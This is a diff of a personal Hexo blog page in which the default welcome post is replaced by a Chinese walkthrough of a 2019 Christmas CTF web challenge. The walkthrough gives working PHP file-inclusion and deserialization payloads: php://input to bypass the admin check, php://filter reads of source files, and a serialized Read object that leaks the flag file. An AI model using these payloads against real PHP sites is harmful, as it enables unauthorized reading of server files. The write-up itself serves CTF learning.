@@ -80,16 +80,23 @@
 
 
 
-<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="description" content="2019圣诞ctf大旗大赛web-admin打开题目查看源代码：  三个get值，user，file，pass； 代码提示需要user&#x3D;admin，file_get_contents()是post形式提交； 这里要用到php:&#x2F;&#x2F;filter协议中的php:&#x2F;&#x2F;input; file提示我们打开class.php; pass暂时没有要求； 构造payload;   看到这里就想到应该是考察php：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://yoursite.com/2020/02/16/hello-world/index.html">
+<meta property="og:title" content="圣诞夺旗admin-wp">
+<meta property="og:url" content="http://yoursite.com/2019/12/25/%E5%9C%A3%E8%AF%9E%E5%A4%BA%E6%97%97admin-wp/index.html">
 <meta property="og:site_name" content="个人博客">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
-<meta property="article:published_time" content="2020-02-16T11:56:24.020Z">
-<meta property="article:modified_time" content="2020-02-16T11:56:24.020Z">
+<meta property="og:description" content="2019圣诞ctf大旗大赛web-admin打开题目查看源代码：  三个get值，user，file，pass； 代码提示需要user&#x3D;admin，file_get_contents()是post形式提交； 这里要用到php:&#x2F;&#x2F;filter协议中的php:&#x2F;&#x2F;input; file提示我们打开class.php; pass暂时没有要求； 构造payload;   看到这里就想到应该是考察php：">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/26/lEZ8IK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/26/lEZ7JU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/26/lEZLQJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/26/lEmZjJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/26/lEnaM4.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/26/lEnfLd.png">
+<meta property="article:published_time" content="2019-12-25T12:39:22.000Z">
+<meta property="article:modified_time" content="2020-02-22T13:24:32.210Z">
 <meta property="article:author" content="dele">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/12/26/lEZ8IK.png">
 
 
 
@@ -119,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/02/16/hello-world/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/12/25/圣诞夺旗admin-wp/"/>
 
 
 
 
 
-  <title>Hello World | 个人博客</title>
+  <title>圣诞夺旗admin-wp | 个人博客</title>
   
 
 
@@ -225,7 +232,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/16/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/25/%E5%9C%A3%E8%AF%9E%E5%A4%BA%E6%97%97admin-wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="dele">
@@ -242,7 +249,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Hello World</h1>
+          <h1 class="post-title" itemprop="name headline">圣诞夺旗admin-wp</h1>
         
 
         <div class="post-meta">
@@ -254,8 +261,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-16T19:56:24+08:00">
-                2020-02-16
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-25T20:39:22+08:00">
+                2019-12-25
               </time>
             
 
@@ -292,20 +299,42 @@
       
 
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+        <h1 id="2019圣诞ctf大旗大赛web-admin"><a href="#2019圣诞ctf大旗大赛web-admin" class="headerlink" title="2019圣诞ctf大旗大赛web-admin"></a>2019圣诞ctf大旗大赛web-admin</h1><p>打开题目查看源代码：</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lEZ8IK.png" alt="lEZ8IK.png"></p>
+<p>三个get值，user，file，pass；</p>
+<p>代码提示需要user=admin，file_get_contents()是post形式提交；</p>
+<p>这里要用到php://filter协议中的php://input;</p>
+<p>file提示我们打开class.php;</p>
+<p>pass暂时没有要求；</p>
+<p>构造payload;</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lEZ7JU.png" alt="lEZ7JU.png"></p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lEZLQJ.png" alt="lEZLQJ.png"></p>
+<p>看到这里就想到应该是考察php：//filter协议了，class.php没显示，构造payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;class.php</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>base64解码：</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lEmZjJ.png" alt="lEmZjJ.png"></p>
+<p>要访问fffffflag.php；但并没有提示如何，尝试多次无果</p>
+<p>于是访问了下index.php；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.55.43.255:28119&#x2F;?user&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&amp;pass&#x3D;1post:admin</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>解码得：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line">$user &#x3D; $_GET[&quot;user&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$pass &#x3D; $_GET[&quot;pass&quot;];</span><br><span class="line"> </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;&#x2F;fffffflag&#x2F;&quot;,$file))&#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file); &#x2F;&#x2F;class.php</span><br><span class="line">        $pass &#x3D; unserialize($pass);</span><br><span class="line">        echo $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">    echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    echo &quot;hava a rest and then change your choose.&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!--</span><br><span class="line">$user &#x3D; $_GET[&quot;user&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$pass &#x3D; $_GET[&quot;pass&quot;];</span><br><span class="line"> </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); &#x2F;&#x2F;class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line"> --</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>重点在：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;&#x2F;fffffflag&#x2F;&quot;,$file))&#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file); &#x2F;&#x2F;class.php</span><br><span class="line">        $pass &#x3D; unserialize($pass);</span><br><span class="line">        echo $pass;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
 
+
+<p>这两句代码再结合之前的Read类，是要反序列化构建pass类才可以。</p>
+<p>构建payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;class.php&amp;pass&#x3D;O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:62:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;fffffflag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag;</p>
+<p><a href="https://imgchr.com/i/lEnaM4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/26/lEnaM4.md.png" alt="lEnaM4.md.png"></a></p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lEnfLd.png" alt="lEnfLd.png"></p>
+<p>反序列化的过程：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Read"</span>:<span class="number">1</span>&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">62</span>:<span class="string">"php://filter/read=convert.base64-encode/resource=fffffflag.php"</span>;&#125;</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:”Read” 指的是 类：个字符：Read</span><br><span class="line"></span><br><span class="line">:<span class="number">2</span>:  指的是 有两个对象</span><br><span class="line"></span><br><span class="line">S:<span class="number">4</span>:”\<span class="number">00</span>*\<span class="number">00</span>file”   指的是有个属性，有<span class="number">4</span>个字符，名为file</span><br><span class="line"></span><br><span class="line">s:<span class="number">62</span>:”flag.php”   指的是属性值，有<span class="number">62</span>个字符，值为			  php://filter/read=convert.base6-encode/resource=fffffflag.php</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -329,8 +358,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/01/30/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/" rel="next" title="python 多线程">
-                <i class="fa fa-chevron-left"></i> python 多线程
+              <a href="/2019/12/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/" rel="next" title="古典密码">
+                <i class="fa fa-chevron-left"></i> 古典密码
               </a>
             
           </div>
@@ -339,8 +368,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/02/18/%E7%AE%80%E4%BB%8B/" rel="prev" title="简介">
-                简介 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/01/15/next-%E6%97%A5%E5%BF%97%E5%92%8C%E5%BD%92%E6%A1%A3%E9%87%8D%E5%90%88%E9%97%AE%E9%A2%98/" rel="prev" title="next 日志和归档重合问题">
+                next 日志和归档重合问题 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -455,7 +484,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2019圣诞ctf大旗大赛web-admin"><span class="nav-number">1.</span> <span class="nav-text">2019圣诞ctf大旗大赛web-admin</span></a></li></ol></div>
             
 
           </div>
